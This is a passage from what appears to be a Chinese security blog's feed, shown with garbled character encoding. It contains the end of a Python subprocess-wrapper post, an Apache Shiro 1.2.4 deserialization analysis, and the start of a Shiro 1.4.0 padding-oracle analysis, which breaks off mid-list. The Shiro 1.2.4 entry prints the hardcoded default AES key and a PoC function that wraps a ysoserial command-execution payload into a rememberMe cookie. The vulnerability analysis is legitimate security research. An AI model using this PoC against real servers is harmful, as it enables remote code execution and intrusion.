è¿›è¡Œå¤„ç†ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥è‡ªå®šçš„å‡½æ•°äº†ï¼Œè¯¥æ‰“æ—¥å¿—æ‰“æ—¥å¿—ï¼Œè¯¥ä¿å­˜ä¿å­˜ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è¿›è¡Œè¶…æ—¶å¤„ç†çš„ï¼Œè¿™é‡Œsubprocessçš„<code>wait(timeout)</code>å·²ç»å…·æœ‰äº†è¶…æ—¶åŠŸèƒ½ï¼Œè¿™é‡Œæˆ‘ä»¬åªè¦æ³¨æ„è¶…æ—¶åå°†å­è¿›ç¨‹æ€æ­»å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    process.wait(timeout=timeout)</span><br><span class="line"><span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">    kill(process.pid)</span><br><span class="line">    log_thread.join()</span><br><span class="line">    <span class="keyword">raise</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æ€æ­»è¿›ç¨‹åï¼Œè¿˜æ˜¯éœ€è¦å°†ç¨‹åºæœ€åè¾“å‡ºè·å–å®Œï¼Œå†ç»“æŸæ—¥å¿—è¿›ç¨‹ã€‚</p><p>æœ€åå¯ä»¥é€šè¿‡æ—¥å¿—å’Œç¨‹åºè¿”å›å€¼<code>process.returncode</code>è·å–ç¨‹åºæ‰§è¡Œæƒ…å†µã€‚</p><h1 id="å°è£…ç±»"><a href="#å°è£…ç±»" class="headerlink" title="å°è£…ç±»"></a>å°è£…ç±»</h1><p>æ ¹æ®ä»¥ä¸Šå®ç°ï¼Œæœ¬äººå°è£…äº†ä¸€ä¸ªè¾ƒä¸ºæ–¹ä¾¿çš„è¶…ç±»ï¼Œç”¨çš„æ—¶å€™åªéœ€è¦ç»§æ‰¿è¿™ä¸ªç±»ï¼Œå†è‡ªå®šä¹‰æ‰“å°æ—¥å¿—å’Œå‘½ä»¤æ‰§è¡Œæˆ‘èƒ½çš„å›è°ƒå‡½æ•°å³å¯ï¼ˆåœ¨å›è°ƒå‡½æ•°ä¸­å¯ä»¥åšå¼‚å¸¸å¤„ç†ï¼‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line">OS_LINUX = <span class="string">"ELF"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kill</span><span class="params">(proc_pid)</span>:</span></span><br><span class="line">    process = psutil.Process(proc_pid)</span><br><span class="line">    <span class="keyword">for</span> proc <span class="keyword">in</span> process.children(recursive=<span class="literal">True</span>):</span><br><span class="line">        proc.kill()</span><br><span class="line">    process.kill()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CommandRunner</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, output_size: int = <span class="number">500</span>)</span>:</span></span><br><span class="line">        self.log_size = output_size</span><br><span class="line">        self.output = list()</span><br><span class="line">        self.lastline = <span class="string">''</span></span><br><span class="line">        self.cmd = <span class="literal">None</span></span><br><span class="line">        _, os = platform.architecture()</span><br><span class="line">        self.os = OS_LINUX <span class="keyword">if</span> <span class="keyword">not</span> os <span class="keyword">else</span> os</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(self, log_line)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span><span class="params">(self, cmd: str, timeout: int = <span class="number">-1</span>)</span> -&gt; int:</span></span><br><span class="line">        logging.info(<span class="string">"Running cmd: \"&#123;&#125;\""</span>.format(cmd))</span><br><span class="line">        <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">            self.cmd = cmd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.cmd = cmd + <span class="string">" &amp; exit"</span></span><br><span class="line">        self.process = subprocess.Popen(self.cmd, shell=<span class="literal">True</span>, bufsize=<span class="number">1024</span>, stdout=subprocess.PIPE,</span><br><span class="line">                                        stderr=subprocess.STDOUT)</span><br><span class="line">        log_thread = threading.Thread(target=self.print_log, args=(self.process.stdout,))</span><br><span class="line">        log_thread.start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> timeout &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.process.wait(timeout=timeout)</span><br><span class="line">            <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">                kill(self.process.pid)</span><br><span class="line">                log_thread.join()</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.process.wait()</span><br><span class="line">        log_thread.join()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.callback()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self, stdout)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> log_line <span class="keyword">in</span> self._log_line_iter(stdout):</span><br><span class="line">            self.log(log_line)</span><br><span class="line">            <span class="keyword">if</span> len(self.output) &gt; self.log_size:</span><br><span class="line">                <span class="keyword">del</span> self.output[<span class="number">0</span>]</span><br><span class="line">            self.output.append(log_line)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_log_line_iter</span><span class="params">(self, reader)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># fix massive log(memory error)</span></span><br><span class="line">            buf = reader.read(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> buf:</span><br><span class="line">                <span class="keyword">if</span> self.os == OS_LINUX:</span><br><span class="line">                    lines = buf.decode(<span class="string">'utf8'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lines = buf.decode(<span class="string">'gbk'</span>, errors=<span class="string">'ignore'</span>)</span><br><span class="line">                lines = lines.replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>).replace(<span class="string">'\r'</span>, <span class="string">'\n'</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">                lines[<span class="number">0</span>] = self.lastline + lines[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> lines[:<span class="number">-1</span>]:</span><br><span class="line">                    <span class="keyword">if</span> len(line) &gt; <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">yield</span> line</span><br><span class="line">                self.lastline = lines[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python å¼€å‘æ‰«æå™¨æ—¶å¾€å¾€ä¼šè°ƒç”¨å…¶ä»–ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œä½†æ˜¯é€šè¿‡ &lt;code&gt;os.system()&lt;/code&gt;æˆ–è€…å…¶ä»–å‘½ä»¤ä¸­æ˜¯ä¼šæœ‰è¿™æ ·æˆ–é‚£æ ·çš„å‘æˆ–ä¸è¶³ï¼Œæœ¬æ–‡å¯¹è¿™äº›é—®é¢˜è¿›è¡Œæ€»ç»“å¹¶æå‡ºè§£å†³æ–¹æ¡ˆï¼Œå¹¶åœ¨ç»“å°¾ç»™å‡ºäº†ä¸€ä¸ªå°è£…å¥½çš„ç±»ï¼Œèƒ½è¾ƒä¸ºå®Œç¾çš„è§£å†³Pythonè°ƒç”¨ç¬¬ä¸‰æ–¹å‘½ä»¤çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;h1 id=&quot;éœ€æ±‚&quot;&gt;&lt;a href=&quot;#éœ€æ±‚&quot; class=&quot;headerlink&quot; title=&quot;éœ€æ±‚&quot;&gt;&lt;/a&gt;éœ€æ±‚&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;é¦–å…ˆï¼Œæˆ‘å¯ä»¥è°ƒç”¨ä»»æ„å‘½ä»¤ï¼Œå¹¶ä¸”å¯ä»¥åœ¨å‘½ä»¤æ‰§è¡Œæ—¶å‘è¾“å…¥é€šé“ï¼ˆstdinï¼‰ä¼ æ›´å¤šè¾“å…¥ï¼ŒåŒæ—¶Pythonèƒ½å®æ—¶è·å–è¾“å‡ºé€šé“ï¼ˆstdoutï¼‰å’Œé”™è¯¯é€šé“ï¼ˆstderrï¼‰è·ç¨‹åºè¾“å‡ºï¼Œæ³¨æ„æ˜¯è·å–è¾“å‡ºï¼Œè€Œä¸æ˜¯å•çº¯çš„å°†è¾“å‡ºé‡å®šå‘åˆ°å±å¹•æˆ–æ–‡ä»¶ä¸­ï¼›&lt;/li&gt;
&lt;li&gt;æˆ‘å¯ä»¥é€šè¿‡è¿”å›å€¼ï¼Œæˆ–è€…ç¨‹åºè¾“å‡ºåˆ¤æ–­ç¬¬ä¸‰æ–¹ç¨‹åºæ‰§è¡Œæ˜¯å¦å‡ºé”™ï¼Œå¦‚æœå‡ºé”™æŠ›å‡ºå¼‚å¸¸æˆ–è€…è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼›&lt;/li&gt;
&lt;li&gt;æ‰§è¡Œå‘½ä»¤æ˜¯æœ€å¥½å¯ä»¥è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œé˜²æ­¢å­å‘½ä»¤å‡æ­»è€Œå½±å“ä¸»ç¨‹åºï¼›&lt;/li&gt;
&lt;li&gt;è¿™æ®µè°ƒç”¨ç¨‹åºåº”è¯¥æ˜¯è·¨å¹³å°çš„ï¼Œæ¯•ç«ŸPythonæœ¬èº«å°±æ˜¯è·¨å¹³å°è¯­è¨€ã€‚&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="å®‰å…¨å¼€å‘" scheme="http://anemone.top/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="å®‰å…¨å¼€å‘" scheme="http://anemone.top/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
      <category term="Python" scheme="http://anemone.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Shiro v1.2.4ååºåˆ—åŒ–</title>
    <link href="http://anemone.top/vulnresearch-Shiro1.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://anemone.top/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/</id>
    <published>2019-11-25T07:16:43.000Z</published>
    <updated>2020-03-21T08:21:20.482Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><h2 id="è§¦å‘å…¥å£"><a href="#è§¦å‘å…¥å£" class="headerlink" title="è§¦å‘å…¥å£"></a>è§¦å‘å…¥å£</h2><p>ç™»å½•ç‚¹å‡»è®°ä½å¯†ç æ—¶ï¼Œæœ‰rememberMeï¼Œä¸‹æ¬¡ç™»é™†æ—¶ä¼šå¸¦rememberMeçš„cookieï¼ŒrememberMeå­˜åœ¨ååºåˆ—åŒ–é—®é¢˜</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563415886850.png" alt="1563415886850"></p><h2 id="åºåˆ—åŒ–å…¥å£"><a href="#åºåˆ—åŒ–å…¥å£" class="headerlink" title="åºåˆ—åŒ–å…¥å£"></a>åºåˆ—åŒ–å…¥å£</h2><p>è°ƒè¯•å¾—åˆ°åºåˆ—åŒ–å…¥å£å’Œè§£å¯†æ–¹æ³•ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(AuthenticationToken, AuthenticationInfo):321</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(Subject, PrincipalCollection)</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes(L360:åºåˆ—åŒ–)</span><br><span class="line">    org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(åŠ å¯†æ–¹æ³•)</span><br></pre></td></tr></table></figure><a id="more"></a><p>åœ¨encryptå‡½æ•°ä¸­å¯ä»¥çœ‹åˆ°åŠ å¯†æ–¹æ³•ä¸ºAES-CBC</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563420577517.png" alt="1563420577517"> </p><h2 id="è·å–åŠ å¯†key"><a href="#è·å–åŠ å¯†key" class="headerlink" title="è·å–åŠ å¯†key"></a>è·å–åŠ å¯†key</h2><p>AbstractRememberMeManager#encrypt() è°ƒç”¨äº†getEncryptionCipherKey()æ–¹æ³•è·å–åŠ å¯†ç”¨çš„key</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425414839.png" alt="1565425414839"></p><p>getEncryptionCipherKeyè¿”å›äº†encryptionCipherKeyï¼ŒencryptionCipherKeyåœ¨AbstractRememberMeManagerç±»åˆå§‹åŒ–æ—¶è®¾ç½®ï¼š</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425554398.png" alt="1565425554398"></p><p>å‘ä¸Šæ‰¾åˆ°AbstractRememberMeManager#DEFAULT_CIPHER_KEY_BYTESï¼Œå¯†é’¥ç¡¬ç¼–ç åˆ°äº†ä»£ç é‡Œï¼š</p><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1565425627351.png" alt="1565425627351"></p><h2 id="åˆ†ærememberMeæ ¼å¼"><a href="#åˆ†ærememberMeæ ¼å¼" class="headerlink" title="åˆ†ærememberMeæ ¼å¼"></a>åˆ†ærememberMeæ ¼å¼</h2><p>ivå’ŒrememberMeäº§ç”Ÿæ¥ç€è°ƒè¯•</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</span><br><span class="line">org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[], byte[], boolean)</span><br></pre></td></tr></table></figure><p><img src="/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563420885798.png" alt="1563420885798"></p><p>å³rememberme=b64(IV+encrypt(serial))</p><p>å› æ­¤æœ‰è§£å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> enc_file, open(<span class="string">"./decrypt.bin"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> dec_file:</span><br><span class="line">    cookie = base64.b64decode(enc_file.read())</span><br><span class="line">    key  = base64.b64decode(<span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>)</span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv=cookie[:<span class="number">16</span>]</span><br><span class="line">    serial=cookie[<span class="number">16</span>:]</span><br><span class="line">    encryptor = AES.new(key, mode, IV=iv)</span><br><span class="line">    remember_bin = encryptor.decrypt(serial)</span><br><span class="line">    dec_file.write(remember_bin)</span><br></pre></td></tr></table></figure><h1 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h1><p>å› æ­¤æœ‰ååºåˆ—åŒ–ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'CommonsCollections4'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS   = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key  =  <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode =  AES.MODE_CBC</span><br><span class="line">    iv   =  uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br></pre></td></tr></table></figure><p>ååºåˆ—åŒ–å…¥å£</p><p>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><pre><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals    org.apache.shiro.mgt.AbstractRememberMeManager#deserialize</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes); <span class="comment">//sink</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;åŸç†&quot;&gt;&lt;a href=&quot;#åŸç†&quot; class=&quot;headerlink&quot; title=&quot;åŸç†&quot;&gt;&lt;/a&gt;åŸç†&lt;/h1&gt;&lt;h2 id=&quot;è§¦å‘å…¥å£&quot;&gt;&lt;a href=&quot;#è§¦å‘å…¥å£&quot; class=&quot;headerlink&quot; title=&quot;è§¦å‘å…¥å£&quot;&gt;&lt;/a&gt;è§¦å‘å…¥å£&lt;/h2&gt;&lt;p&gt;ç™»å½•ç‚¹å‡»è®°ä½å¯†ç æ—¶ï¼Œæœ‰rememberMeï¼Œä¸‹æ¬¡ç™»é™†æ—¶ä¼šå¸¦rememberMeçš„cookieï¼ŒrememberMeå­˜åœ¨ååºåˆ—åŒ–é—®é¢˜&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/vulnresearch-Shiro1.2.4ååºåˆ—åŒ–/1563415886850.png&quot; alt=&quot;1563415886850&quot;&gt;&lt;/p&gt;&lt;h2 id=&quot;åºåˆ—åŒ–å…¥å£&quot;&gt;&lt;a href=&quot;#åºåˆ—åŒ–å…¥å£&quot; class=&quot;headerlink&quot; title=&quot;åºåˆ—åŒ–å…¥å£&quot;&gt;&lt;/a&gt;åºåˆ—åŒ–å…¥å£&lt;/h2&gt;&lt;p&gt;è°ƒè¯•å¾—åˆ°åºåˆ—åŒ–å…¥å£å’Œè§£å¯†æ–¹æ³•ï¼š&lt;/p&gt;&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(AuthenticationToken, AuthenticationInfo):321&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity(Subject, PrincipalCollection)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes(L360:åºåˆ—åŒ–)			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    		org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(åŠ å¯†æ–¹æ³•)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Webå®‰å…¨" scheme="http://anemone.top/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Shiro" scheme="http://anemone.top/tags/Shiro/"/>
    
      <category term="ååºåˆ—åŒ–" scheme="http://anemone.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="Java" scheme="http://anemone.top/tags/Java/"/>
    
      <category term="æ¼æ´åˆ†æ" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Shiro v1.4.0ååºåˆ—åŒ–</title>
    <link href="http://anemone.top/vulnresearch-Shrio1.4.0PaddingOracle%E5%AF%BC%E8%87%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://anemone.top/vulnresearch-Shrio1.4.0PaddingOracleå¯¼è‡´ååºåˆ—åŒ–/</id>
    <published>2019-11-25T07:15:43.000Z</published>
    <updated>2020-03-21T08:11:52.599Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>shiro1.2.5åç§˜é’¥ä¸å†ç¡¬ç¼–ç ï¼Œä½†æ˜¯é‡‡ç”¨CBCåŠ å¯†ä¼šäº§ç”Ÿpadding  oracleæ”»å‡»ï¼Œåˆå› ä¸ºjavaåºåˆ—åŒ–ç»“æ„ä½“åå¯ä»¥åŠ åƒåœ¾å­—ç¬¦ï¼Œæ‰€ä»¥æ”»å‡»èƒ½å¤ŸæˆåŠŸ</p><h1 id="è§£å¯†æ—¶çš„è°ƒç”¨é“¾"><a href="#è§£å¯†æ—¶çš„è°ƒç”¨é“¾" class="headerlink" title="è§£å¯†æ—¶çš„è°ƒç”¨é“¾"></a>è§£å¯†æ—¶çš„è°ƒç”¨é“¾</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals // ä¸è®ºå“ªä¸ªå¼‚å¸¸éƒ½ä¼šè¿”å›nullï¼Œä¸Šå±‚302è·³è½¬</span><br><span class="line">  org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</span><br><span class="line">    org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])</span><br><span class="line">      org.apache.shiro.crypto.JcaCipherService#decrypt(byte[] encrypted, byte[] key, byte[] iv)</span><br><span class="line">        org.apache.shiro.crypto.JcaCipherService#crypt(byte[] encrypted, byte[] key, byte[] iv, int MODE):</span><br><span class="line">          org.apache.shiro.crypto.JcaCipherService#crypt(javax.crypto.Cipher, byte[] encrypted):459 //throw Unable to execute 'doFinal' with cipher instance</span><br><span class="line">            javax.crypto.Cipher#doFinal(byte[] encrypted)  //this=(key+iv+mode) // jce.jaråŒ… è°ƒè¯•ç›´æ¥åœ¨è¿™ä¸‹æ–­ç‚¹</span><br><span class="line">              com.sun.crypto.provider.AESCipher#engineDoFinal(byte[] encrypted, startIdx, len)</span><br><span class="line">                com.sun.crypto.provider.CipherCore#doFinal(byte[] encrypted, startIdx, len)</span><br><span class="line">                  com.sun.crypto.provider.CipherCore#fillOutputBuffer(encrypted, startIdx, iv, startIdx, len, encrypted)</span><br><span class="line">                    com.sun.crypto.provider.CipherCore#unpad(len, decrypted)</span><br><span class="line">                      com.sun.crypto.provider.PKCS5Padding#unpad(decrypted, startIdx, len)  // throw BadPaddingException</span><br><span class="line">  org.apache.shiro.mgt.AbstractRememberMeManager#deserialize(serialized)</span><br><span class="line">    org.apache.shiro.io.DefaultSerializer#deserialize(serialized) // invalid stream header</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="Padding-Oracle-åŸå› "><a href="#Padding-Oracle-åŸå› " class="headerlink" title="Padding  Oracle åŸå› "></a>Padding  Oracle åŸå› </h1><p>ç†è®ºä¸Šå³ä½¿paddingé€šè¿‡ï¼Œååºåˆ—åŒ–ä¹Ÿä¼šå¤±è´¥ï¼Œç»Ÿä¸€æŠ¥é”™å¹¶è¿”å›nullã€‚å› ä¸ºä¸ç®¡æ˜¯Paddingæ­£ç¡®æˆ–æ˜¯é”™è¯¯è¿”å›ç»“æœæ— åŒºåˆ«ï¼Œå› æ­¤æ— æ³•é€ æˆPaddingOracleã€‚</p><p>ä½†æ˜¯æ³¨æ„åˆ°ï¼Œ<strong>è‹¥å½“å­—ç¬¦ä¸²Aå¯ä»¥æˆåŠŸååºåˆ—åŒ–ï¼ŒBä¸ºåƒåœ¾å­—ç¬¦ä¸²ï¼Œåˆ™A+Bå¯ä»¥æˆåŠŸååºåˆ—åŒ–</strong>ï¼ˆè¿™ä¸javaåŸç”Ÿåºåˆ—åŒ–æ•°æ®ç»“æ„æœ‰å…³ï¼‰ï¼Œå› æ­¤å»æ‰SESSIONIDåï¼Œåœ¨æ­£å¸¸çš„rememberMeåé¢æ·»åŠ blockï¼Œå³rememberMe=prefix+iv+secretï¼š</p><p><img src="/vulnresearch-Shrio1.4.0PaddingOracleå¯¼è‡´ååºåˆ—åŒ–/padding.png" alt="padding"></p><p>è¯·æ±‚åï¼š</p><ul><li><p>å¦‚æœBadPaddingException</p><ul><li>è¿”å›é‡æ–°ç™»å½•ï¼ˆsetCookie: 